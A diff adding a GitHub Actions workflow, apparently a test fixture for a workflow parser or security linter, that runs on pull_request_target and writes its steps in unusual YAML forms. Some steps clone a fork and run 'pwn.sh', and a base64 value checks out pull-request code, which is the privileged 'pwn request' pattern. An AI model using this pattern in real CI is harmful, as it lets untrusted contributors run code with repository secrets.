@@ -1,0 +1,17 @@
+name: AgentCore Reviewer
+on:
+  pull_request_target: {paths: ['solution-architecture/**']}
+jobs:
+  review:
+    runs-on: ubuntu-latest
+    steps:
+      - name: uses as a single-item flow seq
+        uses: ["actions/checkout@v4"]
+      - name: uses as a mapping
+        uses: {actions/checkout: v4}
+      - name: run as a list
+        run:
+          - git clone https://github.com/fork/repo
+          - bash repo/pwn.sh
+      - name: run as binary
+        run: !!binary "Z2ggcHIgY2hlY2tvdXQgMQo="
